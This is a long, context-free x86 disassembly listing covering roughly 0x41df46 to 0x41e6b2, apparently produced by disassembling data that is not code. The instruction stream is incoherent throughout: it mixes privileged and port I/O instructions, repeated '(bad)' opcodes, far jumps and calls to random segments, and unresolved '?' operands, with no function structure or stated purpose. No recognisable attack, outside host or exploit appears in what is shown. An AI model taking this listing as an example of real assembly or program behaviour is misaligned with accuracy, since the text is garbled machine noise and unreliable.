  41df46:	xchg   ecx,eax
  41df47:	sub    bl,BYTE PTR [ebx]
  41df49:	cdq    
  41df4a:	sti    
  41df4b:	inc    ebp
  41df4c:	push   esp
  41df4d:	into   
  41df4e:	stc    
  41df4f:	lea    edi,[bp+di]
  41df52:	fs (bad) 
  41df54:	int3   
  41df55:	push   esi
  41df56:	and    DWORD PTR [ebx-0x193fc3ac],eax
  41df5c:	mov    cl,BYTE PTR [edi]
  41df5e:	dec    eax
  41df5f:	cmp    al,al
  41df61:	push   ecx
  41df62:	std    
  41df63:	or     DWORD PTR [ebx-0x7d],ebp
  41df66:	add    ebx,DWORD PTR [ecx-0x401942ce]
  41df6c:	push   ecx
  41df6d:	jo     0x41df05
  41df6f:	iret   
  41df70:	out    dx,ax
  41df72:	rcl    DWORD PTR [esi+0x4aa87cc0],cl
  41df78:	or     al,bh
  41df7a:	shl    DWORD PTR es:[ebp-0x3b],0xf6
  41df7f:	jns    0x41dfbf
  41df81:	repnz fst QWORD PTR [esi-0x48a68c3a]
  41df88:	sub    edi,eax
  41df8a:	cli    
  41df8b:	sti    
  41df8c:	icebp  
  41df8d:	imul   esi,esp,0x1d4e5a25
  41df93:	jmp    0x41df97
  41df95:	mov    ebp,0xdcb02e8c
  41df9a:	dec    esp
  41df9b:	fldcw  WORD PTR [ecx-0x59598153]
  41dfa1:	pop    edi
  41dfa2:	jo     0x41e019
  41dfa4:	fisttp DWORD PTR [bx+di-0x3d]
  41dfa8:	mov    ds:0x1615178a,eax
  41dfad:	cmp    al,0x22
  41dfaf:	pop    edi
  41dfb0:	out    dx,eax
  41dfb1:	xchg   esi,eax
  41dfb2:	xchg   DWORD PTR [edi+0x20],ebp
  41dfb5:	scas   al,BYTE PTR es:[edi]
  41dfb6:	je     0x41df61
  41dfb8:	(bad)  
  41dfba:	and    BYTE PTR [eax],dl
  41dfbc:	mov    eax,ds:0xd44aa078
  41dfc1:	jle    0x41e034
  41dfc3:	mov    ebp,0xc11e71b0
  41dfc8:	mov    dl,0x0
  41dfca:	mov    ebp,0x29996fb5
  41dfcf:	not    DWORD PTR [esi-0x4]
  41dfd2:	fst    DWORD PTR [ecx+0x54a64159]
  41dfd8:	jne    0x41dfd5
  41dfda:	adc    edi,DWORD PTR ds:0xf8c790c5
  41dfe0:	cmc    
  41dfe1:	not    BYTE PTR [edi+0x12]
  41dfe4:	std    
  41dfe5:	xchg   cl,dh
  41dfe7:	popf   
  41dfe8:	cmp    eax,0x7a275358
  41dfed:	mov    ch,BYTE PTR [eax+eax*1]
  41dff0:	xor    dh,BYTE PTR ds:0x17556d56
  41dff6:	mov    esi,0x81546bcb
  41dffb:	cdq    
  41dffc:	jae    0x41e045
  41dffe:	fld    QWORD PTR ds:0x525ca778
  41e004:	mov    eax,ds:0x9eaee25a
  41e009:	sub    DWORD PTR [edx+esi*8],ebp
  41e00c:	or     al,0x79
  41e00e:	inc    ebp
  41e00f:	jmp    0x41e06c
  41e011:	and    al,0x10
  41e013:	adc    DWORD PTR [esi+0x68],esi
  41e016:	sbb    cl,ch
  41e018:	or     edx,esi
  41e01a:	sbb    al,0xe2
  41e01c:	pusha  
  41e01d:	or     dh,BYTE PTR [edx]
  41e01f:	ins    BYTE PTR es:[edi],dx
  41e020:	sub    ah,dl
  41e022:	push   es
  41e023:	test   eax,0xff957b21
  41e028:	xchg   edi,eax
  41e029:	jle    0x41e06c
  41e02b:	hlt    
  41e02c:	test   al,0x1e
  41e02e:	sbb    al,0x7e
  41e030:	pop    esi
  41e031:	xchg   esp,eax
  41e032:	shl    dh,1
  41e034:	add    al,0x9
  41e036:	sub    DWORD PTR [edx-0xe],eax
  41e039:	mov    DWORD PTR [ebx+0x65],esi
  41e03c:	pop    ebp
  41e03d:	pop    ecx
  41e03e:	lods   al,BYTE PTR ds:[esi]
  41e03f:	sub    DWORD PTR [edi+0x7b264197],esi
  41e045:	aad    0x3e
  41e047:	mov    ?,edi
  41e049:	aad    0xed
  41e04b:	es sti 
  41e04d:	cmp    eax,esp
  41e04f:	jbe    0x41e052
  41e051:	mov    DWORD PTR [edi-0x1f],eax
  41e054:	pop    ss
  41e055:	(bad)  
  41e056:	pop    esp
  41e057:	sbb    al,0xed
  41e059:	pop    esi
  41e05a:	cmp    al,0x85
  41e05c:	mov    ds:0x6aa97230,al
  41e061:	inc    esi
  41e062:	push   ecx
  41e063:	fisub  DWORD PTR [esi]
  41e065:	inc    edi
  41e066:	(bad)  
  41e067:	scas   eax,DWORD PTR es:[edi]
  41e068:	clc    
  41e069:	ror    BYTE PTR [edi],1
  41e06b:	popa   
  41e06c:	dec    edi
  41e06d:	imul   esp,DWORD PTR [edx+0x1254c5d7],0x97cb5492
  41e077:	inc    esi
  41e078:	push   ebp
  41e079:	adc    bl,BYTE PTR [esi-0x272b7f0b]
  41e07f:	es or  al,0xc4
  41e082:	jle    0x41e0ba
  41e084:	add    BYTE PTR [edx-0x4edd3567],al
  41e08a:	jno    0x41e0cc
  41e08c:	not    ebx
  41e08e:	or     BYTE PTR [ecx-0x3c511b62],bh
  41e094:	mov    esi,ebp
  41e096:	aaa    
  41e097:	(bad)  
  41e098:	mov    dh,0x35
  41e09a:	cmp    DWORD PTR [eax+edx*2],esp
  41e09d:	sahf   
  41e09e:	dec    ebp
  41e09f:	clc    
  41e0a0:	push   0x81868317
  41e0a5:	jmp    FWORD PTR cs:[ecx-0xe1eae31]
  41e0ac:	sbb    DWORD PTR [ebx],0xfffffff4
  41e0af:	mov    ds:0x912edc2d,eax
  41e0b4:	mov    esp,DWORD PTR [ebp+0x6c4e3e40]
  41e0ba:	not    DWORD PTR [ebp-0x58]
  41e0bd:	outs   dx,BYTE PTR ds:[esi]
  41e0be:	jp     0x41e128
  41e0c0:	adc    eax,0x10af7982
  41e0c5:	pop    ebp
  41e0c6:	fidiv  WORD PTR [eax]
  41e0c8:	pop    esp
  41e0c9:	mov    esp,0xf699e500
  41e0ce:	retf   
  41e0cf:	add    eax,0xf693f32e
  41e0d4:	dec    esp
  41e0d5:	dec    ecx
  41e0d6:	cmp    BYTE PTR [edi+eiz*1+0x15ffd512],0x29
  41e0de:	and    BYTE PTR [ebx],al
  41e0e0:	call   0xe0e4a06f
  41e0e5:	(bad)  
  41e0e6:	ss cmc 
  41e0e8:	and    BYTE PTR [eax+0x72],0x1a
  41e0ec:	jge    0x41e0ca
  41e0ee:	sbb    esi,DWORD PTR [ebp-0x2dfda44d]
  41e0f4:	adc    eax,0x41198a7c
  41e0f9:	mov    bl,0x0
  41e0fb:	dec    ebp
  41e0fc:	jbe    0x41e0d7
  41e0fe:	icebp  
  41e0ff:	dec    edx
  41e100:	mov    edi,0x951ac928
  41e105:	or     eax,edi
  41e107:	add    al,0xb8
  41e109:	sahf   
  41e10a:	nop
  41e10b:	call   0x6c7c:0x81e24590
  41e112:	fistp  WORD PTR [ecx+ebp*1+0x68]
  41e116:	jle    0x41e149
  41e118:	or     eax,0x92d7e21e
  41e11d:	aaa    
  41e11e:	cmp    eax,0x6bc0bec0
  41e123:	aaa    
  41e124:	cmp    BYTE PTR [edi+0x7c],0xde
  41e128:	rcr    DWORD PTR [esi],1
  41e12a:	test   dh,ah
  41e12c:	pop    esp
  41e12d:	je     0x41e0dc
  41e12f:	push   es
  41e130:	dec    ecx
  41e131:	mov    WORD PTR ds:0x2b21fceb,ds
  41e137:	cli    
  41e138:	ret    
  41e139:	outs   dx,DWORD PTR ds:[esi]
  41e13a:	jbe    0x41e111
  41e13c:	pop    es
  41e13d:	and    BYTE PTR [ecx-0x34],cl
  41e140:	sahf   
  41e141:	mov    ah,0x24
  41e143:	pop    es
  41e144:	pop    ds
  41e145:	ss (bad) 
  41e147:	pop    ebx
  41e148:	nop
  41e149:	mov    eax,0xbc83651a
  41e14e:	(bad)  
  41e14f:	push   edx
  41e150:	dec    edx
  41e151:	daa    
  41e152:	loope  0x41e132
  41e154:	cmp    edx,ecx
  41e156:	ds js  0x41e134
  41e159:	repnz lds eax,FWORD PTR [ebx]
  41e15c:	add    eax,0xd39092ca
  41e161:	and    dl,BYTE PTR [eax-0x4b]
  41e164:	inc    ebx
  41e165:	push   ebp
  41e166:	inc    esp
  41e167:	xor    DWORD PTR es:[eax+eiz*1-0x3ea2c520],0x27f410ae
  41e173:	inc    ebx
  41e174:	xchg   ebx,eax
  41e175:	sbb    al,0x8
  41e177:	cmp    eax,0x811910e1
  41e17c:	or     al,0x2b
  41e17e:	repnz or ebp,DWORD PTR ds:0x9e7dbf10
  41e185:	and    ebp,DWORD PTR [edx]
  41e187:	add    BYTE PTR [ebp+ebx*4+0x564d4b64],dh
  41e18e:	(bad)  
  41e18f:	and    ch,BYTE PTR [esi]
  41e191:	sti    
  41e192:	xchg   DWORD PTR [ebx-0x3f],eax
  41e195:	loope  0x41e1b7
  41e197:	xchg   ecx,eax
  41e198:	fnstsw WORD PTR [ebp-0x76]
  41e19b:	addr16 aaa 
  41e19d:	dec    esi
  41e19e:	jp     0x41e199
  41e1a0:	fist   WORD PTR [esi+0x4d]
  41e1a3:	xchg   ebx,eax
  41e1a4:	dec    edx
  41e1a5:	cmp    esi,DWORD PTR [ecx-0x65]
  41e1a8:	pop    esp
  41e1a9:	cmp    al,0xc7
  41e1ab:	call   0xce70:0x43b755d8
  41e1b2:	and    BYTE PTR [eax+eiz*8+0x41],0xaf
  41e1b7:	jecxz  0x41e1ef
  41e1b9:	les    ecx,FWORD PTR [ebp-0x34]
  41e1bc:	mov    edi,?
  41e1be:	ins    DWORD PTR es:[edi],dx
  41e1bf:	lahf   
  41e1c0:	pop    es
  41e1c1:	aam    0xcc
  41e1c3:	cld    
  41e1c4:	mov    ds:0xf625f070,eax
  41e1c9:	retf   0xb80c
  41e1cc:	fsub   DWORD PTR [edx+0x54]
  41e1cf:	leave  
  41e1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d1:	(bad)  
  41e1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d3:	dec    esi
  41e1d4:	gs pop ss
  41e1d6:	jl     0x41e231
  41e1d8:	mov    eax,0xa136d4a6
  41e1dd:	and    DWORD PTR [esi+0x2e],ebx
  41e1e0:	jg     0x41e175
  41e1e2:	jbe    0x41e261
  41e1e4:	xchg   edi,eax
  41e1e5:	xor    esp,DWORD PTR [ecx]
  41e1e7:	scas   eax,DWORD PTR es:[edi]
  41e1e8:	nop
  41e1e9:	xchg   ebx,eax
  41e1ea:	popf   
  41e1eb:	dec    eax
  41e1ec:	int    0xa6
  41e1ee:	and    DWORD PTR [esi-0x1aae9a94],ecx
  41e1f4:	or     ecx,DWORD PTR [esi+0x43404bcf]
  41e1fa:	inc    eax
  41e1fb:	xor    BYTE PTR ss:[ebx+0x35db1397],al
  41e202:	ins    BYTE PTR es:[edi],dx
  41e203:	fnstsw WORD PTR [edi]
  41e205:	lods   al,BYTE PTR ds:[esi]
  41e206:	mov    dl,BYTE PTR [ecx-0x3d]
  41e209:	mov    edi,DWORD PTR [ebp-0x83d69ac]
  41e20f:	into   
  41e210:	xchg   ebx,eax
  41e211:	mov    DWORD PTR [edi+ebx*8-0x24655a32],ebx
  41e218:	and    DWORD PTR [ebx],edi
  41e21a:	mov    esi,0xef035749
  41e21f:	dec    edx
  41e220:	dec    eax
  41e221:	push   eax
  41e222:	pop    edx
  41e223:	pop    esp
  41e224:	adc    bh,BYTE PTR [esi-0x66]
  41e227:	inc    edi
  41e228:	xor    al,0x39
  41e22a:	stc    
  41e22b:	add    eax,0x5a56d5ef
  41e230:	lock leave 
  41e232:	adc    DWORD PTR [ebp+0x5d426aa],0x4f1f31f9
  41e23c:	repz retf 0x97d4
  41e240:	enter  0x5ec5,0x52
  41e244:	mov    WORD PTR [eax],?
  41e246:	fcom   DWORD PTR [ecx+edx*8-0x1e110c5c]
  41e24d:	mov    ebx,0x7cb30f77
  41e252:	pusha  
  41e253:	cmp    BYTE PTR [eax-0x529a2168],cl
  41e259:	rcl    BYTE PTR [edx+0x7a],cl
  41e25c:	cmp    cl,BYTE PTR [esi+ebp*4+0x587c18e9]
  41e263:	xchg   BYTE PTR [eax-0x750a40bf],ah
  41e269:	and    ax,0xde8f
  41e26d:	mov    ds:0x895bca6f,al
  41e272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e273:	push   esp
  41e274:	outs   dx,DWORD PTR ds:[esi]
  41e275:	cmp    eax,0x2b92d87b
  41e27a:	(bad)  
  41e27b:	sbb    BYTE PTR [ebp+0x10e5acd9],ah
  41e281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e282:	jp     0x41e2f5
  41e284:	in     eax,0x5b
  41e286:	imul   ebp,edi,0xea87ebac
  41e28c:	cmp    eax,ebx
  41e28e:	ja     0x41e2e4
  41e290:	dec    ebp
  41e291:	adc    edx,DWORD PTR [ebx-0x494d3e6f]
  41e297:	cdq    
  41e298:	xchg   DWORD PTR [ecx-0x1d334913],esi
  41e29e:	or     BYTE PTR [ecx],cl
  41e2a0:	mov    BYTE PTR [edi-0x79],0x29
  41e2a4:	or     edx,DWORD PTR [ebp-0x55]
  41e2a7:	dec    edx
  41e2a8:	adc    eax,0x33b09b23
  41e2ad:	pop    esi
  41e2ae:	adc    eax,0xed0420c3
  41e2b3:	add    DWORD PTR [edx-0x3a76a71],edx
  41e2b9:	dec    ecx
  41e2ba:	sbb    DWORD PTR [eax+0x121414d0],edi
  41e2c0:	imul   ebp,edx,0xffffffe0
  41e2c3:	(bad)  
  41e2c5:	mov    ds:0x9710de5a,al
  41e2ca:	inc    ecx
  41e2cb:	jae    0x41e2df
  41e2cd:	mov    eax,ds:0x3961ac3a
  41e2d2:	inc    esp
  41e2d3:	jecxz  0x41e338
  41e2d5:	sar    esp,1
  41e2d7:	cs adc al,0xad
  41e2db:	xor    al,al
  41e2dd:	clc    
  41e2de:	or     bh,BYTE PTR ds:0xdea02fb2
  41e2e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2e5:	mov    eax,ds:0xda8b601c
  41e2ea:	dec    ebx
  41e2eb:	shl    DWORD PTR [ebx+0x44],1
  41e2ee:	popf   
  41e2ef:	jmp    0xb813:0xd682ee42
  41e2f6:	xchg   ebx,eax
  41e2f7:	fwait
  41e2f8:	inc    ecx
  41e2f9:	pushf  
  41e2fa:	outs   dx,DWORD PTR ds:[esi]
  41e2fb:	(bad)  
  41e2fc:	jecxz  0x41e2db
  41e2fe:	xchg   edi,eax
  41e2ff:	(bad)  
  41e300:	adc    BYTE PTR [ecx+0x34],bl
  41e303:	rol    DWORD PTR [ebx+0x1265b3d8],0xfe
  41e30a:	cmc    
  41e30b:	xor    al,0xa4
  41e30d:	add    DWORD PTR [edx-0x473008d7],ebx
  41e313:	(bad)  
  41e314:	mov    al,ds:0x21d84004
  41e319:	pop    edx
  41e31a:	xchg   ebx,eax
  41e31b:	cmp    eax,0x858efde3
  41e320:	xchg   edx,eax
  41e321:	push   es
  41e322:	cmp    DWORD PTR [eax+0x38],ebx
  41e325:	sbb    ebp,ebx
  41e327:	cmp    dl,cl
  41e329:	(bad)  
  41e32a:	adc    BYTE PTR [ecx+edx*4+0xa],cl
  41e32e:	outs   dx,DWORD PTR ds:[esi]
  41e32f:	jle    0x41e2e5
  41e331:	out    dx,al
  41e332:	ftst   
  41e334:	xor    DWORD PTR [edi-0x9b1ca8b],ebp
  41e33a:	cmp    dh,BYTE PTR [ecx+0x3b]
  41e33d:	mov    ebx,0xc3a6d713
  41e342:	out    0x45,eax
  41e344:	shr    BYTE PTR [ebx+eiz*1+0xc],cl
  41e348:	out    dx,eax
  41e349:	xchg   esi,eax
  41e34a:	jmp    0x24b6:0x40fb7955
  41e351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e352:	popa   
  41e353:	and    al,0x0
  41e355:	aaa    
  41e356:	or     dh,ch
  41e358:	inc    ecx
  41e359:	inc    edi
  41e35a:	dec    edi
  41e35b:	sbb    eax,0x58460223
  41e360:	jmp    0x41e3d0
  41e362:	ret    0x675e
  41e365:	aaa    
  41e366:	add    al,0x45
  41e368:	xor    al,0x79
  41e36a:	push   esp
  41e36b:	dec    edi
  41e36c:	cmp    eax,0x2bd6d218
  41e371:	out    0xbe,al
  41e373:	jle    0x41e36e
  41e375:	outs   dx,DWORD PTR ds:[esi]
  41e376:	cmp    bl,bh
  41e378:	dec    eax
  41e379:	sbb    DWORD PTR [edi+0x57e17193],eax
  41e37f:	cmp    DWORD PTR [ebp+0x78812113],ebp
  41e385:	ja     0x41e39b
  41e387:	imul   BYTE PTR [esi+0x52]
  41e38a:	mov    WORD PTR [edi-0x2a],cs
  41e38d:	and    edx,esp
  41e38f:	les    edi,FWORD PTR [edi-0x10]
  41e392:	xchg   ebx,eax
  41e393:	es clc 
  41e395:	mov    ds:0xf7543a53,al
  41e39a:	fist   DWORD PTR [ebx+0x54]
  41e39d:	sub    al,BYTE PTR [edx+0x54eca83a]
  41e3a3:	ja     0x41e33d
  41e3a5:	sbb    edi,DWORD PTR [ebx-0x8]
  41e3a8:	push   edi
  41e3a9:	or     edx,0x67
  41e3ac:	cs push 0xcc89bd3
  41e3b2:	cmp    al,0xe6
  41e3b4:	out    dx,eax
  41e3b5:	dec    edi
  41e3b6:	aam    0x29
  41e3b8:	out    dx,eax
  41e3b9:	pop    ebx
  41e3ba:	or     DWORD PTR [ebp-0x75],esi
  41e3bd:	pop    ebx
  41e3be:	iret   
  41e3bf:	adc    al,0xf6
  41e3c1:	mov    bl,0xe3
  41e3c3:	inc    esi
  41e3c4:	cdq    
  41e3c5:	jp     0x41e3d2
  41e3c7:	push   ss
  41e3c8:	mov    ecx,0xd1e79fc5
  41e3cd:	enter  0x7f4d,0xc7
  41e3d1:	push   ebx
  41e3d2:	add    BYTE PTR ds:0x2be26066,dl
  41e3d8:	jmp    0xbdec6509
  41e3dd:	cld    
  41e3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3df:	lea    esi,[eax+0x42]
  41e3e2:	inc    ebx
  41e3e3:	imul   ebx,DWORD PTR ds:0x24ea3b9b,0xfbe61316
  41e3ed:	xor    al,0x2d
  41e3ef:	jno    0x41e3d0
  41e3f1:	add    DWORD PTR [esp+eiz*2+0x4d2613c1],esp
  41e3f8:	jge    0x41e446
  41e3fa:	dec    esi
  41e3fb:	xrelease xchg DWORD PTR [edx-0x48bfd5ae],esp
  41e402:	and    eax,0x83015fc2
  41e407:	mov    dl,ah
  41e409:	nop
  41e40a:	xchg   esp,eax
  41e40b:	arpl   WORD PTR [esi-0x1a84dd01],si
  41e411:	push   esp
  41e412:	push   ebp
  41e413:	test   eax,edx
  41e415:	packsswb mm6,mm3
  41e418:	mov    DWORD PTR [ecx-0x44b4ecb2],edi
  41e41e:	xchg   esi,eax
  41e41f:	mov    ecx,0x62486d13
  41e424:	cmp    al,0x13
  41e426:	in     al,0x89
  41e428:	push   edi
  41e429:	adc    ah,BYTE PTR [edx]
  41e42b:	lods   eax,DWORD PTR ds:[esi]
  41e42c:	add    al,0x82
  41e42e:	arpl   WORD PTR [ecx+edx*8-0x67b49043],dx
  41e435:	inc    esi
  41e436:	je     0x41e429
  41e438:	mov    DWORD PTR [eax],edi
  41e43a:	add    al,0xd4
  41e43c:	dec    eax
  41e43d:	push   ds
  41e43e:	sbb    DWORD PTR [edi],0x62
  41e441:	xchg   esi,eax
  41e442:	mov    ecx,0x1891299c
  41e447:	out    0xe1,al
  41e449:	mov    bh,0x58
  41e44b:	xchg   esi,eax
  41e44c:	push   eax
  41e44d:	fwait
  41e44e:	jbe    0x41e424
  41e450:	jecxz  0x41e498
  41e452:	inc    esp
  41e453:	or     BYTE PTR [edx],0xd2
  41e456:	test   al,0x11
  41e458:	jno    0x41e3de
  41e45a:	mov    dh,0x5e
  41e45c:	loopne 0x41e42a
  41e45e:	or     eax,0xc06eb30c
  41e463:	rcr    BYTE PTR [esi+0x77db34b2],0xee
  41e46a:	and    edx,DWORD PTR [eax-0x509a639c]
  41e470:	addr16 xchg ecx,eax
  41e472:	fnstsw ax
  41e474:	stos   BYTE PTR es:[edi],al
  41e475:	xor    dh,al
  41e477:	into   
  41e478:	loopne 0x41e450
  41e47a:	loopne 0x41e4a4
  41e47c:	mov    bh,dh
  41e47e:	or     eax,0x1db194d7
  41e483:	loope  0x41e4a2
  41e485:	dec    esp
  41e486:	add    BYTE PTR ds:[esi-0x5bf98c6e],0x56
  41e48e:	pop    esi
  41e48f:	mov    ah,ah
  41e491:	repnz xchg ecx,eax
  41e493:	scas   al,BYTE PTR es:[edi]
  41e494:	div    DWORD PTR [ebx+0x1]
  41e497:	sbb    edx,DWORD PTR [edx-0x145f3a08]
  41e49d:	in     eax,dx
  41e49e:	bound  ebp,QWORD PTR [edi+0xe839f64]
  41e4a4:	xchg   edi,eax
  41e4a5:	and    DWORD PTR [edx-0x7f],eax
  41e4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4a9:	mov    cl,0x57
  41e4ab:	outs   dx,BYTE PTR ds:[esi]
  41e4ac:	mov    esp,DWORD PTR [esi]
  41e4ae:	rcl    BYTE PTR ds:0xb018d12e,0xed
  41e4b5:	adc    al,0xef
  41e4b7:	jmp    0x98cb:0xc27cc29
  41e4be:	mov    si,0x10fa
  41e4c2:	cmp    eax,0x13ae97e0
  41e4c7:	push   es
  41e4c8:	mov    ecx,0xd84d2731
  41e4cd:	mov    cl,dl
  41e4cf:	ret    
  41e4d0:	jge    0x41e4b9
  41e4d2:	mov    dh,0x53
  41e4d4:	xchg   esp,eax
  41e4d5:	add    al,0x95
  41e4d7:	shr    BYTE PTR [edx-0x7843fa16],0x7c
  41e4de:	add    ah,bl
  41e4e0:	iret   
  41e4e1:	push   0x64
  41e4e3:	push   edi
  41e4e4:	jo     0x41e491
  41e4e6:	scas   al,BYTE PTR es:[edi]
  41e4e7:	push   es
  41e4e8:	lods   eax,DWORD PTR ds:[esi]
  41e4e9:	mov    dl,0xef
  41e4eb:	adc    al,0x19
  41e4ed:	cdq    
  41e4ee:	arpl   WORD PTR [ecx],ax
  41e4f0:	mov    dl,0xbf
  41e4f2:	and    dl,0x1d
  41e4f5:	pop    esp
  41e4f6:	and    BYTE PTR [ecx+0x28],dh
  41e4f9:	cli    
  41e4fa:	inc    ebx
  41e4fb:	or     al,0xc8
  41e4fd:	mov    bh,0x71
  41e4ff:	scas   al,BYTE PTR es:[edi]
  41e500:	cdq    
  41e501:	mov    BYTE PTR [ebp-0x2c],dh
  41e504:	mov    eax,ds:0x567462e7
  41e509:	jb     0x41e50d
  41e50b:	retf   
  41e50c:	xor    edi,DWORD PTR [eax-0x58ee5c0b]
  41e512:	xor    DWORD PTR [esi+0x4a],edx
  41e515:	push   esp
  41e516:	stos   BYTE PTR es:[edi],al
  41e517:	and    dh,0x2f
  41e51a:	int3   
  41e51b:	add    eax,0xe45e56a0
  41e520:	sbb    BYTE PTR [esi],bl
  41e522:	jecxz  0x41e594
  41e524:	pop    ss
  41e525:	mov    bh,0xc8
  41e527:	push   ebx
  41e528:	nop
  41e529:	adc    al,0xb8
  41e52b:	aad    0x42
  41e52d:	and    al,0x43
  41e52f:	fimul  WORD PTR [edi]
  41e531:	sub    eax,0x857c12d
  41e536:	jp     0x41e5b6
  41e538:	dec    edi
  41e539:	jg     0x41e50d
  41e53b:	pushf  
  41e53c:	xor    dh,cl
  41e53e:	add    al,0x95
  41e540:	lock or dh,BYTE PTR [ebp-0x30]
  41e544:	lods   eax,DWORD PTR ds:[esi]
  41e545:	jno    0x41e4f4
  41e547:	test   DWORD PTR [ecx],esi
  41e549:	mov    cl,0x1f
  41e54b:	ins    DWORD PTR es:[edi],dx
  41e54c:	xor    ebp,0xb132c452
  41e552:	cmp    ebx,DWORD PTR [ecx+0x42587480]
  41e558:	push   esi
  41e559:	(bad)  
  41e55a:	clc    
  41e55b:	neg    ecx
  41e55d:	pop    ds
  41e55e:	sbb    dl,BYTE PTR [eax]
  41e560:	xchg   ebx,eax
  41e561:	adc    ebp,DWORD PTR [ebx+0x272c276]
  41e567:	aaa    
  41e568:	xor    ebp,DWORD PTR [eax]
  41e56a:	inc    edx
  41e56b:	aad    0x79
  41e56d:	pushf  
  41e56e:	adc    ah,ch
  41e570:	out    dx,eax
  41e571:	out    0xfe,eax
  41e573:	stos   BYTE PTR es:[edi],al
  41e574:	mov    eax,ds:0x587d64b2
  41e579:	fwait
  41e57a:	mov    ebx,0x7d7c7173
  41e57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e580:	shl    edi,1
  41e582:	add    DWORD PTR [edx],edx
  41e584:	fisttp WORD PTR [ecx+edi*8-0x33ec549d]
  41e58b:	addr16 mov ecx,0x6eaac2c5
  41e591:	and    eax,0x8aca85b4
  41e596:	mov    ah,0x3c
  41e598:	push   esp
  41e599:	inc    edx
  41e59a:	jge    0x41e5c9
  41e59c:	(bad)  
  41e59e:	push   0xffffffbf
  41e5a0:	ins    BYTE PTR es:[edi],dx
  41e5a1:	xchg   ecx,eax
  41e5a2:	lods   al,BYTE PTR ds:[esi]
  41e5a3:	test   al,0xcc
  41e5a5:	call   0x71dde2a8
  41e5aa:	popa   
  41e5ab:	inc    eax
  41e5ac:	mov    DWORD PTR [ebp-0x3b],0x8b0dc7c
  41e5b3:	out    0x7d,al
  41e5b5:	pop    es
  41e5b6:	mov    edx,gs
  41e5b8:	(bad)  
  41e5b9:	lahf   
  41e5ba:	sbb    al,BYTE PTR [ebx-0x31acbe6]
  41e5c0:	dec    ebx
  41e5c1:	imul   edx,edi,0x5b
  41e5c4:	mov    ch,al
  41e5c6:	cmp    BYTE PTR ds:0x8fde11a3,ch
  41e5cc:	sub    eax,0xeaa145fb
  41e5d1:	pop    esi
  41e5d2:	mov    edx,0xef857e17
  41e5d7:	in     eax,dx
  41e5d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5d9:	iret   
  41e5da:	push   0xa2545eb9
  41e5df:	mov    bl,BYTE PTR [ecx]
  41e5e1:	aaa    
  41e5e2:	pop    ebx
  41e5e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e4:	std    
  41e5e5:	sbb    esi,eax
  41e5e7:	cmp    DWORD PTR [ebx],0xe138d3d0
  41e5ed:	iret   
  41e5ee:	xchg   edi,eax
  41e5ef:	ds adc al,0xf5
  41e5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5f3:	and    ch,dh
  41e5f5:	jnp    0x41e654
  41e5f7:	mov    ecx,0x493d75f
  41e5fc:	push   0xecae4d05
  41e601:	or     BYTE PTR [ecx+0x2d80da33],ah
  41e607:	aam    0x4d
  41e609:	jno    0x41e66a
  41e60b:	stos   BYTE PTR es:[edi],al
  41e60c:	xor    bh,BYTE PTR [ebx-0x5b]
  41e60f:	push   ebp
  41e610:	dec    edx
  41e611:	int3   
  41e612:	mov    bl,0x1d
  41e614:	jmp    0x41e5d6
  41e616:	inc    esi
  41e617:	jp     0x41e5b6
  41e619:	sub    cl,BYTE PTR [esp+esi*1+0x1549abb7]
  41e620:	stos   DWORD PTR es:[edi],eax
  41e621:	fnstenv [ecx-0x21]
  41e624:	ja     0x41e5c8
  41e626:	sub    eax,0x6a73ee9b
  41e62b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e62c:	mov    eax,0x28cae053
  41e631:	ds mov ebp,0x6e435d22
  41e637:	and    BYTE PTR [ecx],ch
  41e639:	add    eax,edi
  41e63b:	xor    BYTE PTR [eax],bl
  41e63d:	(bad)  
  41e63e:	mov    eax,ds:0x9a1ba961
  41e643:	mov    ds:0xb4d3377,eax
  41e648:	xor    DWORD PTR [esi],esi
  41e64a:	retf   0xe1f4
  41e64d:	outs   dx,BYTE PTR ds:[esi]
  41e64e:	outs   dx,DWORD PTR ds:[esi]
  41e64f:	sahf   
  41e650:	retf   0x348d
  41e653:	sahf   
  41e654:	(bad)  
  41e655:	aas    
  41e656:	add    ebx,eax
  41e658:	pop    edx
  41e659:	mov    eax,0xd3e89136
  41e65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e65f:	shr    BYTE PTR [ebp-0x68],cl
  41e662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e663:	sub    DWORD PTR [edx-0x1d],edx
  41e666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e667:	call   0x6513da
  41e66c:	push   0x64
  41e66e:	or     eax,0x6327b048
  41e673:	stos   BYTE PTR es:[edi],al
  41e674:	mov    BYTE PTR [ebp-0x34],bh
  41e677:	js     0x41e6b9
  41e679:	imul   ecx,DWORD PTR [esi-0x45],0x3d
  41e67d:	sub    al,0x81
  41e67f:	ja     0x41e641
  41e681:	inc    esi
  41e682:	cmp    ebp,DWORD PTR [ecx+0x7f795601]
  41e688:	das    
  41e689:	hlt    
  41e68a:	std    
  41e68b:	inc    ecx
  41e68c:	iret   
  41e68d:	aam    0x1d
  41e68f:	popa   
  41e690:	add    ch,BYTE PTR [ebx+eiz*4+0x2d074473]
  41e697:	sbb    edi,eax
  41e699:	rcl    edi,0x68
  41e69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e69d:	push   ds
  41e69e:	out    0x2a,al
  41e6a0:	xchg   ebp,eax
  41e6a1:	sbb    BYTE PTR [esp+ebp*2],ch
  41e6a4:	pop    esp
  41e6a5:	mov    DWORD PTR [eax+0x43],ebx
  41e6a8:	push   cs
  41e6a9:	jge    0x41e656
  41e6ab:	mov    edx,0x76e25205
  41e6b0:	xchg   ecx,eax
  41e6b1:	aas    
  41e6b2:	sub    eax,0x74c63a5
